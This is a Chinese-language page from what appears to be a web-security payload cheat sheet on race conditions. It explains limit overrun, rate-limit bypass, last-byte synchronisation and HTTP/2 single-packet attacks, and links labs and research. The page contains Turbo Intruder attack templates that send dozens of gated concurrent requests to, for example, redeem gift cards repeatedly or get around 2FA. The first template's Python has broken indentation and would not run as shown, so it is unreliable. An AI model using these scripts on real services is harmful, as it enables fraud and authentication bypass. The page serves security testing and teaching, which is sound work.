[README.en.md](README.en.md)

# 竞争条件

> 当一个进程严重或意外地依赖于其他事件的序列或时机时，竞争条件可能会发生。在 Web 应用程序环境中，可以同时处理多个请求，开发人员可能会让并发性由框架、服务器或编程语言来处理。

## 摘要

- [工具](#tools)
- [方法](#methodology)
    - [限制溢出](#limit-overrun)
    - [速率限制绕过](#rate-limit-bypass)
- [技术](#techniques)
    - [HTTP/1.1 最后字节同步](#http11-last-byte-synchronization)
    - [HTTP/2 单包攻击](#http2-single-packet-attack)
- [Turbo Intruder](#turbo-intruder)
    - [示例 1](#example-1)
    - [示例 2](#example-2)
- [实验室](#labs)
- [参考资料](#references)

## 工具

- [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) - 用于发送大量 HTTP 请求并分析结果的 Burp Suite 扩展。
- [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) - 使在 Web 应用程序中利用竞争条件变得高度高效和易于使用。
- [nxenon/h2spacex](https://github.com/nxenon/h2spacex) - 基于 Scapy‌ + 利用时序攻击的 HTTP/2 单包攻击低级库/工具

## 方法

### 限制溢出

限制溢出指的是多个线程或进程竞争更新或访问共享资源，导致资源超出其预期限制的场景。

**示例**：超额限制、多次投票、多次消费礼品卡。

- [竞争条件允许多次兑换礼品卡，导致免费"金钱" - @muon4](https://hackerone.com/reports/759247)
- [竞争条件可用于绕过邀请限制 - @franjkovic](https://hackerone.com/reports/115007)
- [使用一个邀请注册多个用户 - @franjkovic](https://hackerone.com/reports/148609)

### 速率限制绕过

当攻击者利用速率限制机制中缺乏适当同步来超出预期的请求限制时，就会发生速率限制绕过。速率限制旨在控制操作的频率（例如，API 请求、登录尝试），但竞争条件可以允许攻击者绕过这些限制。

**示例**：绕过反暴力机制和 2FA。

- [Instagram 密码重置机制竞争条件 - Laxman Muthiyah](https://youtu.be/4O9FjTMlHUM)

## 技术

### HTTP/1.1 最后字节同步

发送除最后一个字节之外的所有请求，然后通过发送最后一个字节来"释放"每个请求。

使用 Turbo Intruder 执行最后字节同步

```py
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')
```

**示例**:

- [破解 reCAPTCHA，Turbo Intruder 风格 - James Kettle](https://portswigger.net/research/cracking-recaptcha-turbo-intruder-style)

### HTTP/2 单包攻击

在 HTTP/2 中，您可以通过单个连接并发发送多个 HTTP 请求。在单包攻击中，大约 ~20/30 个请求将被发送，它们将同时到达服务器。使用单个请求消除网络抖动。

- [PortSwigger/turbo-intruder/race-single-packet-attack.py](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py)
- Burp Suite
    - 将请求发送到 Repeater
    - 复制请求 20 次 (CTRL+R)
    - 创建新组并添加所有请求
    - 并行发送组（单包攻击）

**示例**:

- [CVE-2022-4037 - 使用单包攻击在 Gitlab 中发现竞争条件漏洞 - James Kettle](https://youtu.be/Y0NVIVucQNE)

## Turbo Intruder

### 示例 1

1. 将请求发送到 turbo intruder
2. 使用此 Python 代码作为 turbo intruder 的负载

   ```python
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False
                           )

   for i in range(30):
       engine.queue(target.req, i)
           engine.queue(target.req, target.baseInput, gate='race1')


       engine.start(timeout=5)
   engine.openGate('race1')

       engine.complete(timeout=60)


   def handleResponse(req, interesting):
       table.add(req)
   ```

3. 现在设置外部 HTTP 标头 x-request: %s - :warning: 这是 turbo intruder 所需的
4. 点击"Attack"

### 示例 2

当您必须在发送 request1 后立即发送 request2 的竞争条件时，可以使用以下模板，窗口可能只有几毫秒。

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    request1 = '''
POST /target-URI-1 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>

parameterName=parameterValue
    '''

    request2 = '''
GET /target-URI-2 HTTP/1.1
Host: <REDACTED>
Cookie: session=<REDACTED>
    '''

    engine.queue(request1, gate='race1')
    for i in range(30):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)
def handleResponse(req, interesting):
    table.add(req)
```

## 实验室

- [PortSwigger - 限制溢出竞争条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)
- [PortSwigger - 多端点竞争条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
- [PortSwigger - 通过竞争条件绕过速率限制](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
- [PortSwigger - 多端点竞争条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
- [PortSwigger - 单端点竞争条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)
- [PortSwigger - 利用时序敏感漏洞](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)
- [PortSwigger - 部分构建竞争条件](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)

## 参考资料

- [超越限制：通过第一个序列同步扩展单包竞争条件以突破 65,535 字节限制 - @ryotkak - 2024年8月2日](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [DEF CON 31 - 打破状态机 Web 竞争条件的真正潜力 - James Kettle (@albinowax) - 2023年9月15日](https://youtu.be/tKJzsaB1ZvI)
- [利用 Web 应用程序中的竞争条件漏洞 - Javan Rasokat - 2022年10月6日](https://conference.hitb.org/hitbsecconf2022sin/materials/D2%20COMMSEC%20-%20Exploiting%20Race%20Condition%20Vulnerabilities%20in%20Web%20Applications%20-%20Javan%20Rasokat.pdf)
- [Web 竞争条件的新技术和工具 - Emma Stocks - 2023年8月10日](https://portswigger.net/blog/new-techniques-and-tools-for-web-race-conditions)
- [Web 应用程序中的竞争条件错误：用例 - Mandeep Jadon - 2018年4月24日](https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e)
- [Web 上的竞争条件 - Josip Franjkovic - 2016年7月12日](https://www.josipfranjkovic.com/blog/race-conditions-on-web)
- [打破状态机：Web 竞争条件的真正潜力 - James Kettle (@albinowax) - 2023年8月9日](https://portswigger.net/research/smashing-the-state-machine)
- [Turbo Intruder：拥抱十亿请求攻击 - James Kettle (@albinowax) - 2019年1月25日](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)